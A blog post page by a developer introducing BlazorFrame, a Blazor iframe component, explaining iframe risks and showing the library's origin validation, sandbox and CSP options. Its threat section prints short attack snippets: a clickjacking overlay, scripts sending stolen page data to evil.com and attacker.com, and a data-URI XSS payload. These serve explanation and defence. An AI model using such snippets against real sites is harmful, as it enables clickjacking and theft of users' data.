@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlazorFrame: Enhanced iframes in Blazor - Tim Maes</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="nav">
+            <div class="nav-brand">
+                <div class="logo">
+                    <div class="shield-icon"></div>
+                    <span>Tim Maes</span>
+                </div>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li><a href="blog.html" class="nav-link active">Blog</a></li>
+                <li><a href="index.html#about" class="nav-link">About</a></li>
+                <li><a href="#resume" class="nav-link">Resume</a></li>
+                <li><a href="#contact" class="nav-link">Contact</a></li>
+            </ul>
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Article Header -->
+    <section class="article-header">
+        <div class="container">
+            <div class="article-meta">
+                <span class="article-date">July 13th, 2025</span>
+                <span class="article-category">Blazor</span>
+                <span class="article-category">iframe</span>
+            </div>
+            <h1 class="article-title">BlazorFrame: Enhanced iframes in Blazor</h1>
+            <p class="article-subtitle">
+                A security-first, enhanced Blazor iframe component that addresses the security landscape of iframes in modern .NET applications
+            </p>
+        </div>
+    </section>
+
+    <!-- Article Content -->
+    <article class="article-content">
+        <div class="container">
+            <div class="article-body">
+                <div style="text-align: center; margin: 2rem 0;">
+                    <a href="https://www.github.com/Tim-Maes/BlazorFrame" target="_blank">
+                        <img src="https://github.com/Tim-Maes/BlazorFrame/blob/master/assets/BlazorFrameLogo.png?raw=true"
+                             alt="BlazorFrame Logo"
+                             style="max-width: 100%; width: 800px;" />
+                    </a>
+                </div>
+
+                <p>Iframes (inline frames) are one of the most powerful yet dangerous features of the modern web. They allow us to embed third-party content into our applications, but they also open the door to a host of security vulnerabilities that can compromise our users and data.</p>
+
+                <p>As I was implementing an iframe for a project, I was surprised there was no solution for this available. Many Blazor component libraries are available, yet none had a solution for an iframe component. This is why I started working on a custom wrapper.</p>
+
+                <p>In this post, we'll explore the security landscape of iframes, examine how they work in Blazor applications, and explain how <strong>BlazorFrame</strong> provides a security-first solution for modern .NET developers.</p>
+
+                <h2>What are iframes and why do we need them?</h2>
+
+                <p>An iframe is an HTML element that allows you to embed another HTML document within the current page. Think of it as a window into another website or application that lives inside your own page.</p>
+
+                <pre><code class="language-html">&lt;!-- Basic iframe - simple but dangerous --&gt;
+&lt;iframe src="https://example.com" width="100%" height="400px"&gt;&lt;/iframe&gt;</code></pre>
+
+                <p>Iframes are everywhere in modern web development:</p>
+                <ul>
+                    <li><strong>Payment processors</strong> (Stripe, PayPal checkout forms)</li>
+                    <li><strong>Social media widgets</strong> (Twitter embeds, Facebook comments)</li>
+                    <li><strong>Analytics dashboards</strong> (Google Analytics, third-party reporting tools)</li>
+                    <li><strong>Maps and location services</strong> (Google Maps, Mapbox)</li>
+                    <li><strong>Video players</strong> (YouTube, Vimeo embeds)</li>
+                    <li><strong>Chat widgets</strong> (Customer support, live chat)</li>
+                </ul>
+
+                <p>Without iframes, we'd need to redirect users away from our applications or rebuild complex functionality from scratch. They are often essential for creating rich, integrated user experiences.</p>
+
+                <h2>The darker side: iframe security vulnerabilities</h2>
+
+                <p>However, iframes come with significant security risks that many developers overlook:</p>
+
+                <h3>1. Clickjacking attacks</h3>
+
+                <p>Clickjacking tricks users into clicking on something different from what they perceive. An attacker overlays an invisible iframe containing a legitimate action (like "Delete Account") over a harmless-looking button.</p>
+
+                <pre><code class="language-html">&lt;!-- Malicious page --&gt;
+&lt;style&gt;
+  .invisible-iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    opacity: 0.1; /* Nearly invisible */
+    z-index: 1000;
+  }
+&lt;/style&gt;
+
+&lt;button&gt;Win a Free iPhone!&lt;/button&gt;
+&lt;iframe src="https://bank.com/transfer-money" class="invisible-iframe"&gt;&lt;/iframe&gt;</code></pre>
+
+                <h3>2. Cross-Frame scripting (XFS)</h3>
+
+                <p>When iframes can execute JavaScript, they may access or manipulate the parent page's DOM, steal data, or perform actions on behalf of the user.</p>
+
+                <pre><code class="language-javascript">// Malicious iframe code
+if (parent !== window) {
+  // Access parent window data
+  var userData = parent.document.getElementById('user-data').innerText;
+  
+  // Send stolen data to attacker
+  fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: userData
+  });
+}</code></pre>
+
+                <h3>3. Unvalidated postMessage communication</h3>
+
+                <p>Modern web applications use <code>postMessage</code> for secure cross-frame communication, but without proper validation, this becomes a vulnerability:</p>
+
+                <pre><code class="language-javascript">// Vulnerable code - accepts messages from any origin
+window.addEventListener('message', function(event) {
+  // DANGEROUS: No origin validation
+  if (event.data.action === 'updateUser') {
+    updateUserProfile(event.data.userData);
+  }
+});</code></pre>
+
+                <h3>4. Content Security Policy (CSP) bypass</h3>
+
+                <p>Poorly configured CSP policies can be bypassed through iframes, allowing malicious scripts to execute:</p>
+
+                <pre><code class="language-html">&lt;!-- CSP: script-src 'self' --&gt;
+&lt;!-- This bypasses CSP if iframe sources aren't restricted --&gt;
+&lt;iframe src="data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+
+                <h3>5. Data exfiltration</h3>
+
+                <p>Iframes can be used to exfiltrate sensitive data through various techniques:</p>
+
+                <pre><code class="language-javascript">// Iframe reads sensitive data and sends it elsewhere
+var sensitiveData = document.body.innerText;
+var img = new Image();
+img.src = 'https://attacker.com/log?data=' + encodeURIComponent(sensitiveData);</code></pre>
+
+                <p>Yet, the vast majority of iframes, are windows to public sites or URLs, don't require any user interaction or authentication. A small set of enterprise applications, do face this issue, and most probably always write their own implementation of a iframe wrapper in some way or form.</p>
+
+                <h2>Blazor and iframes: A match made in... complexity</h2>
+
+                <p>Blazor Server and Blazor WebAssembly (WASM) both have unique considerations when working with iframes:</p>
+
+                <h3>Blazor Server challenges</h3>
+
+                <p><strong>SignalR Connection Security</strong>: Blazor Server maintains a persistent SignalR connection. Malicious iframes could potentially:</p>
+                <ul>
+                    <li>Intercept SignalR messages</li>
+                    <li>Trigger unwanted server calls</li>
+                    <li>Consume server resources</li>
+                </ul>
+
+                <p><strong>Server-Side state</strong>: Since UI state lives on the server, iframe interactions could lead to:</p>
+                <ul>
+                    <li>State corruption</li>
+                    <li>Unauthorized state access</li>
+                    <li>Memory leaks from unmanaged iframe lifecycles</li>
+                </ul>
+
+                <h3>Blazor WASM challenges</h3>
+
+                <p><strong>Client-Side vulnerabilities</strong>: WASM applications run entirely in the browser, making them susceptible to:</p>
+                <ul>
+                    <li>Client-side data theft</li>
+                    <li>Local storage manipulation</li>
+                    <li>Authentication token extraction</li>
+                </ul>
+
+                <p><strong>Assembly inspection</strong>: Unlike server-side code, WASM assemblies can be inspected, making security through obscurity impossible.</p>
+
+                <h3>Common Blazor iframe pitfalls</h3>
+
+                <pre><code class="language-razor">@* DANGEROUS: No security considerations *@
+&lt;iframe src="@ThirdPartyUrl" width="100%" height="400px"&gt;&lt;/iframe&gt;
+
+@code {
+    // URL comes from user input or database - potential XSS vector
+    private string ThirdPartyUrl = "https://example.com";
+}</code></pre>
+
+                <p>The standard Blazor approach of implementing iframes provides no built-in security, leaving developers to implement security measures manually - often incompletely or incorrectly.</p>
+
+                <h2>BlazorFrame: Security-first iframe management</h2>
+
+                <p>This is where <strong>BlazorFrame</strong> comes in. BlazorFrame is a comprehensive Blazor component library that addresses iframe security concerns while providing a seamless developer experience.</p>
+
+                <h3>Key Security Features</h3>
+
+                <h4>1. Automatic Origin Validation</h4>
+
+                <p>BlazorFrame automatically validates the origin of all iframe messages:</p>
+
+                <pre><code class="language-razor">@using BlazorFrame
+
+&lt;BlazorFrame Src="https://widget.example.com"
+            OnValidatedMessage="HandleMessage"
+            OnSecurityViolation="HandleViolation" /&gt;
+
+@code {
+    private Task HandleMessage(IframeMessage message)
+    {
+        // Only validated messages reach here
+        Console.WriteLine($"Safe message from {message.Origin}: {message.Data}");
+        return Task.CompletedTask;
+    }
+
+    private Task HandleViolation(IframeMessage violation)
+    {
+        // Log security violations for monitoring
+        Console.WriteLine($"SECURITY VIOLATION: {violation.ValidationError}");
+        return Task.CompletedTask;
+    }
+}</code></pre>
+
+                <h4>2. Multiple Sandbox Security Levels</h4>
+
+                <p>BlazorFrame provides five distinct sandbox security levels:</p>
+
+                <pre><code class="language-csharp">// For untrusted content - maximum security
+var paranoidOptions = new MessageSecurityOptions()
+    .ForProduction()
+    .WithParanoidSandbox();  // Scripts only, no forms, no popups
+
+// For payment widgets - strict but functional
+var paymentOptions = new MessageSecurityOptions()
+    .ForPaymentWidget()
+    .ValidateAndThrow();
+
+// For trusted widgets - permissive but controlled
+var trustedOptions = new MessageSecurityOptions()
+    .ForDevelopment()
+    .WithPermissiveSandbox();</code></pre>
+
+                <h4>3. Content Security Policy Integration</h4>
+
+                <p>BlazorFrame generates and validates CSP headers automatically:</p>
+
+                <pre><code class="language-razor">&lt;BlazorFrame Src="https://widget.example.com"
+            CspOptions="@cspOptions"
+            OnCspHeaderGenerated="HandleCspGenerated" /&gt;
+
+@code {
+    private readonly CspOptions cspOptions = new CspOptions()
+        .ForProduction()
+        .AllowFrameSources("https://widget.example.com")
+        .WithScriptNonce("secure-nonce-123");
+        
+    private Task HandleCspGenerated(CspHeader cspHeader)
+    {
+        // Apply CSP header to HTTP response
+        HttpContext.Response.Headers.Add(
+            cspHeader.HeaderName, 
+            cspHeader.HeaderValue
+        );
+        return Task.CompletedTask;
+    }
+}</code></pre>
+
+                <h4>4. Message Size and Content Validation</h4>
+
+                <p>All iframe communication is validated for size and content:</p>
+
+                <pre><code class="language-csharp">var securityOptions = new MessageSecurityOptions
+{
+    EnableStrictValidation = true,
+    MaxMessageSize = 32 * 1024,  // 32KB limit
+    LogSecurityViolations = true
+};</code></pre>
+
+                <h4>5. Environment-Aware Security</h4>
+
+                <p>BlazorFrame automatically adjusts security settings based on your environment:</p>
+
+                <pre><code class="language-csharp">// Development - relaxed for debugging
+var devOptions = new MessageSecurityOptions()
+    .ForDevelopment()
+    .WithPermissiveSandbox();
+
+// Production - strict security
+var prodOptions = new MessageSecurityOptions()
+    .ForProduction()
+    .WithStrictSandbox()
+    .RequireHttps()
+    .ValidateAndThrow();</code></pre>
+
+                <h2>Real-World security scenarios</h2>
+
+                <p>Let's examine how BlazorFrame handles common security challenges:</p>
+
+                <h3>Scenario 1: Payment widget integration</h3>
+
+                <pre><code class="language-razor">@page "/checkout"
+
+&lt;h3&gt;Secure Payment Processing&lt;/h3&gt;
+
+&lt;BlazorFrame Src="@paymentWidgetUrl"
+            SecurityOptions="@paymentSecurity"
+            OnValidatedMessage="HandlePaymentMessage"
+            OnSecurityViolation="HandlePaymentViolation" /&gt;
+
+@code {
+    private readonly string paymentWidgetUrl = "https://payments.stripe.com/widget";
+    
+    private readonly MessageSecurityOptions paymentSecurity = new MessageSecurityOptions()
+        .ForPaymentWidget()        // Maximum security preset
+        .RequireHttps()           // Enforce HTTPS
+        .WithStrictSandbox()      // Limited iframe permissions
+        .ValidateAndThrow();      // Fail fast on security issues
+
+    private async Task HandlePaymentMessage(IframeMessage message)
+    {
+        if (message.MessageType == "payment_success")
+        {
+            // Process successful payment
+            await ProcessPayment(message.Data);
+        }
+    }
+
+    private async Task HandlePaymentViolation(IframeMessage violation)
+    {
+        // Log security violation for fraud detection
+        logger.LogCritical("Payment security violation: {Error}", violation.ValidationError);
+        
+        // Notify security team
+        await securityService.ReportViolation(violation);
+    }
+}</code></pre>
+
+                <h3>Scenario 2: Customer Support Chat Widget</h3>
+
+                <pre><code class="language-razor">@page "/support"
+
+&lt;h3&gt;Live Support Chat&lt;/h3&gt;
+
+&lt;BlazorFrame Src="@chatWidgetUrl"
+            SecurityOptions="@chatSecurity"
+            EnableAutoResize="true"
+            OnValidatedMessage="HandleChatMessage" /&gt;
+
+@code {
+    private readonly string chatWidgetUrl = "https://chat.support.com/widget";
+    
+    private readonly MessageSecurityOptions chatSecurity = new MessageSecurityOptions()
+        .ForProduction()
+        .WithBasicSandbox()       // Allow forms and same-origin
+        .AllowOrigin("https://chat.support.com")
+        .WithMaxMessageSize(64 * 1024);  // Allow larger messages for chat
+
+    private async Task HandleChatMessage(IframeMessage message)
+    {
+        switch (message.MessageType)
+        {
+            case "chat_started":
+                await analyticsService.TrackEvent("SupportChatStarted");
+                break;
+            case "resize_request":
+                // BlazorFrame handles this automatically
+                break;
+        }
+    }
+}</code></pre>
+
+                <h2>Performance and Auto-Resizing</h2>
+
+                <p>Beyond security, BlazorFrame provides intelligent auto-resizing capabilities:</p>
+
+                <pre><code class="language-razor">&lt;BlazorFrame Src="https://dynamic-content.com"
+            EnableAutoResize="true"    &lt;!-- Smart height adjustment --&gt;
+            EnableScroll="false"       &lt;!-- No scrollbars needed --&gt;
+            OnValidatedMessage="HandleResize" /&gt;
+
+@code {
+    private Task HandleResize(IframeMessage message)
+    {
+        if (message.MessageType == "resize")
+        {
+            // BlazorFrame automatically handles height adjustment
+            // Uses ResizeObserver when available, falls back to polling
+        }
+        return Task.CompletedTask;
+    }
+}</code></pre>
+
+                <h2>Best practices for secure iframe usage</h2>
+
+                <p>Based on the capabilities of BlazorFrame, here are essential best practices:</p>
+
+                <h3>1. Always use sandbox attributes</h3>
+
+                <pre><code class="language-csharp">// Good: Explicitly configure sandbox
+var options = new MessageSecurityOptions()
+    .WithStrictSandbox()      // Scripts + same-origin only
+    .RequireHttps();
+
+// Bad: No sandbox restrictions
+var options = new MessageSecurityOptions(); // Uses defaults</code></pre>
+
+                <h3>2. Validate all Origins</h3>
+
+                <pre><code class="language-csharp">// Good: Explicit origin validation
+var options = new MessageSecurityOptions()
+    .AllowOrigin("https://trusted-widget.com")
+    .AllowOrigin("https://api.trusted-widget.com");
+
+// Bad: Accepting all origins
+var options = new MessageSecurityOptions()
+    .AllowOrigin("*");  // NEVER do this</code></pre>
+
+                <h3>3. Environment-Specific configuration</h3>
+
+                <pre><code class="language-csharp">public class IframeSecurityService
+{
+    public MessageSecurityOptions GetSecurityOptions(IWebHostEnvironment env)
+    {
+        if (env.IsDevelopment())
+        {
+            return new MessageSecurityOptions()
+                .ForDevelopment()
+                .WithPermissiveSandbox()
+                .Validate();  // Warn but don't throw
+        }
+        
+        return new MessageSecurityOptions()
+            .ForProduction()
+            .WithStrictSandbox()
+            .RequireHttps()
+            .ValidateAndThrow();  // Fail fast in production
+    }
+}</code></pre>
+
+                <h3>4. Monitor security violations</h3>
+
+                <pre><code class="language-csharp">private async Task HandleSecurityViolation(IframeMessage violation)
+{
+    // Log for security monitoring
+    logger.LogWarning("Iframe security violation: {Error} from {Origin}", 
+        violation.ValidationError, violation.Origin);
+    
+    // Track violations in metrics
+    await metricsService.IncrementCounter("iframe.security.violations", 
+        new[] { ("origin", violation.Origin), ("error_type", violation.MessageType) });
+    
+    // Notify security team for repeated violations
+    if (await IsRepeatedViolator(violation.Origin))
+    {
+        await securityService.BlockOrigin(violation.Origin);
+    }
+}</code></pre>
+
+                <h2>The Future of secure iframe integration</h2>
+
+                <p>As web applications become more complex and security threats evolve, libraries like BlazorFrame represent the future of secure iframe integration:</p>
+
+                <ul>
+                    <li><strong>Zero-Trust by Default</strong>: Assume all iframe content is malicious until proven otherwise</li>
+                    <li><strong>Automated Security</strong>: Let libraries handle complex security logic</li>
+                    <li><strong>Environment Awareness</strong>: Different security postures for different environments</li>
+                    <li><strong>Comprehensive Monitoring</strong>: Track and respond to security violations</li>
+                    <li><strong>Developer-Friendly</strong>: Security that doesn't compromise productivity</li>
+                </ul>
+
+                <h2>Conclusion</h2>
+
+                <p>Iframes are a powerful tool for creating rich, integrated web experiences, but they come with significant security risks that require careful attention. The traditional approach of manually implementing iframe security is error-prone and often incomplete.</p>
+
+                <p>I hope my solution represents a paradigm shift toward security-first iframe management in Blazor applications. By providing built-in origin validation, sandbox security levels, CSP integration, and comprehensive monitoring, it allows developers to leverage the power of iframes without compromising security.</p>
+
+                <p>Whether you're embedding payment widgets, customer support tools, or analytics dashboards, BlazorFrame provides the security foundation you need to protect your users and your business.</p>
+
+                <p>The web is a dangerous place, but with the right tools and practices, we can build secure, robust applications that leverage the best of what the internet has to offer.</p>
+
+                <h2>Resources</h2>
+
+                <ul>
+                    <li><strong>BlazorFrame Documentation</strong>: <a href="https://github.com/Tim-Maes/BlazorFrame/blob/master/docs/readme.md" target="_blank">Complete documentation and examples</a></li>
+                    <li><strong>NuGet Package</strong>: <a href="https://www.nuget.org/packages/BlazorFrame" target="_blank">Install BlazorFrame</a></li>
+                    <li><strong>Source Code</strong>: <a href="https://github.com/Tim-Maes/BlazorFrame" target="_blank">GitHub Repository</a></li>
+                    <li><strong>Interactive Demo</strong>: <a href="https://github.com/Tim-Maes/BlazorFrameDemo" target="_blank">Try BlazorFrame live</a></li>
+                </ul>
+
+
+                <div style="text-align: center; margin: 2rem 0;">
+                    <a href="https://www.github.com/Tim-Maes/BlazorFrame" target="_blank">
+                        <img src="https://github.com/Tim-Maes/BlazorFrame/blob/master/assets/BlazorFrameLogo2.png?raw=true"
+                             alt="BlazorFrame Logo"
+                             style="max-width: 100%; width: 200px;" />
+                    </a>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="logo">
+                        <div class="shield-icon"></div>
+                        <span>Tim Maes</span>
+                    </div>
+                    <p>Building secure and innovative solutions</p>
+                </div>
+                <div class="footer-links">
+                    <div class="footer-section">
+                        <h4>Navigation</h4>
+                        <a href="index.html">Home</a>
+                        <a href="blog.html">Blog</a>
+                        <a href="index.html#about">About</a>
+                        <a href="#resume">Resume</a>
+                    </div>
+                    <div class="footer-section">
+                        <h4>Connect</h4>
+                        <a href="https://github.com/Tim-Maes" target="_blank">GitHub</a>
+                        <a href="https://linkedin.com/in/tim-maes" target="_blank">LinkedIn</a>
+                        <a href="mailto:hello@timmaes.dev">Email</a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 Tim Maes. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mobile menu toggle
+        const hamburger = document.querySelector('.hamburger');
+        const navMenu = document.querySelector('.nav-menu');
+
+        hamburger.addEventListener('click', () => {
+            hamburger.classList.toggle('active');
+            navMenu.classList.toggle('active');
+        });
+
+        // Header scroll effect
+        window.addEventListener('scroll', () => {
+            const header = document.querySelector('.header');
+            if (window.scrollY > 100) {
+                header.classList.add('scrolled');
+            } else {
+                header.classList.remove('scrolled');
+            }
+        });
+
+        // Initialize syntax highlighting
+        hljs.highlightAll();
+    </script>
+</body>
+</html>
